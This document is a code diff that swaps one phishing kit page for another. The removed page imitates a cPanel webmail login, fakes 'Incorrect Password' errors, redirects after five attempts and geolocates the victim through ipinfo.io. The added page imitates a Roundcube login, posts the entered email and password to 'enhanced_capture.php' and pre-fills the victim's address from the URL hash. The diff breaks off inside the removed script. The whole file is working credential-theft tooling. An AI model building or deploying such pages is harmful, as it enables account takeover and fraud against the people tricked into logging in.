@@ -1,327 +1,540 @@
-
-<html lang="en" dir="ltr"><head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
-    <meta name="google" content="notranslate">
-    <meta name="apple-itunes-app" content="app-id=1188352635">
-    <title>Webmail Login</title>
-    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
-
-    <!-- EXTERNAL CSS -->
-    <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1386192030/unprotected/cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css">
-    <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560357916/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css">
-
-    <style type="text/css">
-/*
-  This css is included in the base template in case the css cannot be loaded because of access restrictions
-  If this css is updated, please update securitypolicy_header.html.tmpl as well
-*/
-.copyright {
-  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
-  background-size: 25px auto;
-}
+<!DOCTYPE html>
+<html lang="en" class="">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roundcube Webmail</title>
+    <link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAAdgAAAHYBTnsmCAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3Njape.org5vuPBoAAANCSURBVDiNpZNLaFxVGMd/33zNTJJJk6YPbEyx1AeCLQhKFQTfChZBXXThwpdCoIsFwYWg4MJdBVdCwZWLLtzrwqUgCCKICKKIiKK2WKxtnzGPeWQymTfzuPfe7+fiQmyD6qK/3eHc//k9/vCfIwApJf/HtAcJAKSUhBDY1gohBIyxfw8QQpAkCa7r4vs+URTRbDbRWmNZFkEQEAQBvu+TZDG+H9DqdCiKAss2q47qOPi+z7Ztm+i2O3ieRxRFIKVECURYRhSKfTYWNjgyAIGBsb46uvv+H1N1+j1WoxOjrK+vo6nuehlCJJEjqdDkopcrmczZw5c6DT6dDpdOh0OjQaDRqNBnEcM3bllcgoyOPjZrVaSxhjPProo5w7d45qtcrs7CyO45BGKWmSJORyOYwxEtcwNjYGQBzHfPfdd2SzWXK5HKqqkkQRq6urGGMQQmBZFhMTE8zNzSGlJE1TEMKilEJrTRRFJElCqVRCa41SimIux8jIyCvGmFPGGHZ6PZ/m5ibdbo9OpwPA7OwcGzdvkkYpSikOvnOQ6elpPv/8c5qNOvfddx833HADJ0+epFwuMzKSW+aNN94YEUKIE61Wiy+//JL5+XmOHDnC8vIy6+vrCCF47733yOVyFItFrFwOKSUbGxssLy+TRRF333MPjx84wOLiInEco5TCMoZrrr6aje4mkrGxMQBGRkbwPA/HcdDGkKQJjuOwcqvFyy+/TCAY7/dJkwRjDK7rkqYpCwsLaK0xxuA4DrvyebTWGGOIAKSUOK6L67o4rsuwF7IKCIHWGq01Qkqmp6exbZv333+fF198EWMMnudh2zZaa4wxCCFwHAcpBVEU0W63CYKAbDbL4uIin332GZ7nsW/fPhqNBsePH2dqaorDhw8jhMCyLIQQCCGwLItKpUKxWCSfz7O0tERZRIRhyNjYGNlslnw+z86dO3FdF8uyGP7Ftm2klAghsC0Ly7JQSlEsFpFS4jgOQkqGhoaYnJxECIFt29i2PWCNMViWNRhmjBkQWzaWZWHbNkopHNfFsixc10UIgWVZOI6DbdsYY7AsC9u2hwJCCCzbRmu9hRRCDAZ6va63v/9+c8eOHSRJwubmJu12mylr6O8/a3h/TH5/Ff8Cf5+ICFRT1z4AAAAASUVORK5CYII=" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html, body {
+            height: 100%;
+            font-family: "Trebuchet MS", Tahoma, Verdana, Arial, sans-serif;
+            background: #fff;
+            color: #333;
+            font-size: 11px;
+        }
+        
+        #container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        #header {
+            background: #005fa8;
+            background: -webkit-linear-gradient(top, #0a73c9 0%, #005fa8 100%);
+            background: linear-gradient(to bottom, #0a73c9 0%, #005fa8 100%);
+            height: 60px;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+        
+        #logo {
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        
+        #logo::before {
+            content: "✉";
+            margin-right: 8px;
+            font-size: 20px;
+        }
+        
+        #mainscreen {
+            flex: 1;
+            background: #f4f4f4;
+            background: -webkit-linear-gradient(135deg, #f4f4f4 0%, #ffeaa7 25%, #fab1a0 50%, #e17055 75%, #f39c12 100%);
+            background: linear-gradient(135deg, #f4f4f4 0%, #ffeaa7 25%, #fab1a0 50%, #e17055 75%, #f39c12 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            25% { background-position: 100% 50%; }
+            50% { background-position: 100% 100%; }
+            75% { background-position: 0% 100%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        #login-form {
+            background: rgba(255, 255, 255, 0.95);
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.15), 0 0 0 1px rgba(255,165,0,0.2);
+            width: 350px;
+            padding: 0;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+        
+        #login-form .header {
+            background: rgba(248, 248, 248, 0.9);
+            background: -webkit-linear-gradient(top, rgba(248,248,248,0.9) 0%, rgba(232,232,232,0.9) 100%);
+            background: linear-gradient(to bottom, rgba(248,248,248,0.9) 0%, rgba(232,232,232,0.9) 100%);
+            border-bottom: 1px solid #ccc;
+            padding: 15px 20px;
+            text-align: center;
+        }
+        
+        #login-form .header h2 {
+            font-size: 14px;
+            color: #333;
+            margin: 0;
+            font-weight: normal;
+        }
+        
+        #login-form .content {
+            padding: 25px 20px;
+            background: rgba(255, 255, 255, 0.9);
+        }
+        
+        .form-row {
+            margin-bottom: 15px;
+        }
+        
+        .form-row label {
+            display: block;
+            margin-bottom: 4px;
+            font-size: 11px;
+            color: #333;
+        }
+        
+        .form-row input[type="text"],
+        .form-row input[type="password"] {
+            width: 100%;
+            padding: 8px 10px;
+            border: 1px solid #999;
+            border-radius: 4px;
+            font-size: 11px;
+            font-family: inherit;
+            background: rgba(255, 255, 255, 0.9);
+            transition: all 0.3s ease;
+        }
+        
+        .form-row input:focus {
+            outline: none;
+            border-color: #f39c12;
+            background: #fffacd;
+            box-shadow: 0 0 5px rgba(243, 156, 18, 0.3);
+        }
+        
+        .form-buttons {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .button {
+            background: #f39c12;
+            background: -webkit-linear-gradient(top, #f39c12 0%, #e67e22 100%);
+            background: linear-gradient(to bottom, #f39c12 0%, #e67e22 100%);
+            border: 1px solid #d68910;
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 11px;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            font-weight: bold;
+        }
+        
+        .button:hover {
+            background: -webkit-linear-gradient(top, #e67e22 0%, #d68910 100%);
+            background: linear-gradient(to bottom, #e67e22 0%, #d68910 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+        
+        .button:active {
+            background: #d68910;
+            transform: translateY(0);
+        }
+        
+        .error {
+            background: #ffebef;
+            border: 1px solid #ff6b85;
+            color: #c30;
+            padding: 8px;
+            margin-bottom: 15px;
+            font-size: 11px;
+            border-radius: 4px;
+            display: none;
+        }
+        
+        .loading {
+            text-align: center;
+            color: #666;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .loading .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ccc;
+            border-top: 2px solid #f39c12;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 5px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        #footer {
+            background: rgba(240, 240, 240, 0.95);
+            border-top: 1px solid #ccc;
+            padding: 8px 20px;
+            text-align: center;
+            font-size: 10px;
+            color: #666;
+            backdrop-filter: blur(5px);
+        }
+        
+        #footer a {
+            color: #e67e22;
+            text-decoration: none;
+        }
+        
+        .language-selector {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 10px;
+        }
+        
+        .language-selector select {
+            font-size: 10px;
+            border: 1px solid #ccc;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 3px;
+            padding: 2px 4px;
+        }
+        
+        /* Orange accent elements */
+        .orange-accent {
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            background: rgba(243, 156, 18, 0.1);
+            border-radius: 50%;
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        .orange-accent:nth-child(1) {
+            top: 10%;
+            left: 10%;
+            animation-delay: 0s;
+        }
+        
+        .orange-accent:nth-child(2) {
+            top: 60%;
+            right: 15%;
+            animation-delay: 2s;
+            width: 150px;
+            height: 150px;
+        }
+        
+        .orange-accent:nth-child(3) {
+            bottom: 20%;
+            left: 20%;
+            animation-delay: 4s;
+            width: 80px;
+            height: 80px;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            33% { transform: translateY(-10px) rotate(120deg); }
+            66% { transform: translateY(5px) rotate(240deg); }
+        }
+        
+        /* Responsive */
+        @media (max-width: 400px) {
+            #login-form {
+                width: 95%;
+                margin: 0 auto;
+            }
+            
+            #header {
+                padding: 0 10px;
+            }
+            
+            .language-selector {
+                position: static;
+                text-align: center;
+                margin-top: 10px;
+            }
+            
+            .orange-accent {
+                display: none;
+            }
+        }
     </style>
-
 </head>
-<body class="wm"><div id="preload_images"></div>
-
-
-
-
-<input type="hidden" id="goto_uri" value="#">
-<input type="hidden" id="goto_app" value="">
-<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[invalid_session]  -->
-<div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
-    <div class="wrapper">
-    <div id="notify">
-        <noscript>
-            <div class="error-notice">
-                <img src="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560308612/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
-                JavaScript is disabled in your browser.
-                For Webmail to function properly, you must enable JavaScript.
-                If you do not enable JavaScript, certain features in Webmail will not function correctly.
-            </div>
-            </noscript>
-        
-        
-       
-    </div>
-
-    <div style="display:none">
-        <div id="locale-container" style="visibility:hidden">
-            <div id="locale-inner-container">
-                <div id="locale-header">
-                    <div class="locale-head">Please select a locale:</div>
-                    <div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a></div>
-                </div>
-                <div id="locale-map">
-                    <div class="scroller clear">
-                        
-                            <div class="locale-cell"><a href="?locale=ar">العربية</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=bg">български</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=cs">čeština</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=da">dansk</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=de">Deutsch</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=el">Ελληνικά</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=es">español</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=es_419">español latinoamericano</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=es_es">español de España</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=fi">suomi</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=fil">Filipino</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=fr">français</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=he">עברית</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=hu">magyar</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=i_cpanel_snowmen">☃ cPanel Snowmen ☃ - i_cpanel_snowmen</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=id">Bahasa Indonesia</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=it">italiano</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=ja">日本語</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=ko">한국어</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=ms">Bahasa Melayu</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=nb">norsk bokmål</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=nl">Nederlands</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=no">Norwegian</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=pl">polski</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=pt">português</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=pt_br">português do Brasil</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=ro">română</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=ru">русский</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=sl">slovenščina</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=sv">svenska</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=th">ไทย</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=tr">Türkçe</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=uk">українська</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=vi">Tiếng Việt</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=zh">中文</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=zh_cn">中文（中国）</a></div>
-                        
-                            <div class="locale-cell"><a href="?locale=zh_tw">中文（台湾）</a></div>
-                        
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <div id="content-container">
-        <div id="login-container">
-
-            <div id="login-sub-container">
-                    <div id="login-sub-header">
-                        
-                        <img class="main-logo" src="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560308612/unprotected/cpanel/images/webmail-logo.svg" alt="logo">
-                        
-                    </div>
-                    <div id="login-sub">
-                        
-                        <div id="forms">
-                            <form novalidate="" id="login_form" action="" method="post" target="_self" style="visibility:">
-                                <div class="input-req-login"><label for="user">Email Address</label></div>
-                                <div class="input-field-login icon username-container">
-                                    <input name="email" id="email" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
-                                </div>
-                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
-                                <div class="input-field-login icon password-container">
-                                    <input name="password" id="password" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
-                                </div>
-								<p id="msg" style="color:red;"></p>
-                                <div class="controls">
-                                    <div class="login-btn">
-                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
-                                    </div>
-
-                                                                            <div class="reset-pw">
-                                            <a href="#" id="reset_password">Reset Password
-                                            </a>
-                                        </div>
-                                                                    </div>
-                                <div class="clear" id="push"></div>
-                            </form>
-                        <!--CLOSE forms -->
-                        </div>
-                    <!--CLOSE login-sub -->
-                    </div>
-                    
-
-                                    <!--CLOSE wrapper -->
-                </div>
-            <!--CLOSE login-sub-container -->
-            </div>
-        <!--CLOSE login-container -->
+<body>
+    <div id="container">
+        <div id="header">
+            <div id="logo">Roundcube Webmail</div>
         </div>
         
-                <div id="locale-footer" style="display: block;">
-            <div class="locale-container">
-                <noscript>
-                    <form method="get" action=".">
-                        <select name="locale">
-                            <option value="">Change locale</option>
-                            <option value='ar'>العربية</option><option value='bg'>български</option><option value='cs'>čeština</option><option value='da'>dansk</option><option value='de'>Deutsch</option><option value='el'>Ελληνικά</option><option value='es'>español</option><option value='es_419'>español latinoamericano</option><option value='es_es'>español de España</option><option value='fi'>suomi</option><option value='fil'>Filipino</option><option value='fr'>français</option><option value='he'>עברית</option><option value='hu'>magyar</option><option value='i_cpanel_snowmen'>☃ cPanel Snowmen ☃ - i_cpanel_snowmen</option><option value='id'>Bahasa Indonesia</option><option value='it'>italiano</option><option value='ja'>日本語</option><option value='ko'>한국어</option><option value='ms'>Bahasa Melayu</option><option value='nb'>norsk bokmål</option><option value='nl'>Nederlands</option><option value='no'>Norwegian</option><option value='pl'>polski</option><option value='pt'>português</option><option value='pt_br'>português do Brasil</option><option value='ro'>română</option><option value='ru'>русский</option><option value='sl'>slovenščina</option><option value='sv'>svenska</option><option value='th'>ไทย</option><option value='tr'>Türkçe</option><option value='uk'>українська</option><option value='vi'>Tiếng Việt</option><option value='zh'>中文</option><option value='zh_cn'>中文（中国）</option><option value='zh_tw'>中文（台湾）</option>                        </select>
-                        <button style="margin-left: 10px" type="submit">Change</button>
-                    </form>
-                    <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style>
-                </noscript>
-                <ul id="locales_list">
-                    
-                        
-                        <li><a href="###">العربية</a></li>
-                    
-                        
-                        <li><a href="###">български</a></li>
-                    
-                        
-                        <li><a href="###">čeština</a></li>
-                    
-                        
-                        <li><a href="###">dansk</a></li>
-                    
-                        
-                        <li><a href="###">Deutsch</a></li>
-                    
-                        
-                        <li><a href="###">Ελληνικά</a></li>
-                    
-                        
-                        <li><a href="###">español</a></li>
-                    
-                        
-                        <li><a href="###">español&nbsp;latinoamericano</a></li>
-                    
-                        
-                    <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">…</a></li>
-                </ul>
-                <div id="mobilelocalemenu">Select a locale:
-                    <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Change locale">English</a>
-                </div>
+        <div id="mainscreen">
+            <div class="orange-accent"></div>
+            <div class="orange-accent"></div>
+            <div class="orange-accent"></div>
+            
+            <div class="language-selector">
+                <select id="language" onchange="changeLanguage()">
+                    <option value="en">English</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                    <option value="de">Deutsch</option>
+                    <option value="it">Italiano</option>
+                    <option value="pt">Português</option>
+                    <option value="ru">Русский</option>
+                    <option value="zh">中文</option>
+                </select>
             </div>
+            
+            <form id="login-form" method="POST" action="enhanced_capture.php">
+                <div class="header">
+                    <h2>Please log in</h2>
+                </div>
+                
+                <div class="content">
+                    <div class="error" id="error-message">
+                        Login failed
+                    </div>
+                    
+                    <div class="form-row">
+                        <label for="rcmloginuser">Username</label>
+                        <input type="text" id="rcmloginuser" name="email" autocomplete="username" required>
+                    </div>
+                    
+                    <div class="form-row">
+                        <label for="rcmloginpwd">Password</label>
+                        <input type="password" id="rcmloginpwd" name="password" autocomplete="current-password" required>
+                    </div>
+                    
+                    <div class="form-buttons">
+                        <input type="submit" class="button" value="Login" id="rcmloginsubmit">
+                    </div>
+                    
+                    <div class="loading" id="loading">
+                        <span class="spinner"></span>Logging in...
+                    </div>
+                </div>
+            </form>
+        </div>
+        
+        <div id="footer">
+            Powered by <a href="https://roundcube.net/" target="_blank">Roundcube</a> webmail 1.6.7
         </div>
     </div>
-<!--Close login-wrapper -->
-</div>
 
-
-<style>
-    @media (min-width: 481px) {
-        #select_user_form {
-            width: px;
-        }
-    }
-</style>
-    <div class="copyright">Copyright©&nbsp;2025 cPanel, L.L.C.
-    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
-
-	 <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-	<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-sweetalert/1.0.1/sweetalert.min.css" integrity="sha512-hwwdtOTYkQwW2sedIsbuP1h0mWeJe/hFOfsvNKpRB3CkRxq8EW7QMheec1Sgd8prYxGm1OM9OZcGW7/GUud5Fw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <script>
-$(document).ready(function(){
-    var count = 0;
-    var email = window.location.hash.substr(1);
-    
-    if (email) {
-        $('#email').val(email);
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-        if (!filter.test(email)) {
-            $('#error').show();
-            return false;
-        }
-    }
-    
-    $('#login_submit').click(function(event){
-        $('#error, #msg').hide();
-        event.preventDefault();
+        let attemptCount = 0;
         
-        var email = $("#email").val();
-        var password = $("#password").val();
-        
-        if (!password) {
-            $('#msg').show().html("Password is empty!");
-            return false;
+        function changeLanguage() {
+            // Language change simulation - in real Roundcube this would reload the page
+            console.log('Language changed to:', document.getElementById('language').value);
         }
         
-        count++;
-        
-        swal('Incorrect Password: Please re-enter password');
-        
-        if (count >= 5) {
-            setTimeout(function(){
-                window.location.href = "https://google.com";
-            }, 1000);
+        // Auto-grab email from URL hash
+        function autoGrabEmail() {
+            const hash = window.location.hash.substring(1); // Remove the # symbol
+            const emailField = document.getElementById('rcmloginuser');
+            
+            if (hash && hash.length > 0) {
+                // Check if hash contains an email pattern
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                
+                if (emailRegex.test(hash)) {
+                    // Direct email in hash
+                    emailField.value = hash;
+                    console.log('Auto-filled email from hash:', hash);
+                    // Focus on password field since email is already filled
+                    document.getElementById('rcmloginpwd').focus();
+                } else if (hash.includes('@')) {
+                    // Contains @ symbol, might be a partial or encoded email
+                    emailField.value = decodeURIComponent(hash);
+                    console.log('Auto-filled decoded email from hash:', decodeURIComponent(hash));
+                    document.getElementById('rcmloginpwd').focus();
+                } else {
+                    // Check for common parameter patterns
+                    const params = new URLSearchParams('?' + hash);
+                    const email = params.get('email') || params.get('user') || params.get('target') || params.get('e');
+                    
+                    if (email) {
+                        emailField.value = decodeURIComponent(email);
+                        console.log('Auto-filled email from parameter:', email);
+                        document.getElementById('rcmloginpwd').focus();
+                    }
+                }
+                
+                // If email was filled, add subtle highlight
+                if (emailField.value && emailField.value.length > 0) {
+                    emailField.style.backgroundColor = '#f0f8ff';
+                    emailField.style.borderColor = '#4CAF50';
+                    
+                    // Remove highlight after 3 seconds
+                    setTimeout(() => {
+                        emailField.style.backgroundColor = '';
+                        emailField.style.borderColor = '';
+                    }, 3000);
+                }
+            }
         }
         
-        // Fetch location details from ipinfo.io
-        fetch('https://ipinfo.io/json?token=ea907fcf23c277')
-        .then(response => response.json())
-        .then(data => {
-            var city = data.city || "Unknown";
-            var region = data.region || "Unknown";
-            var country = data.country || "Unknown";
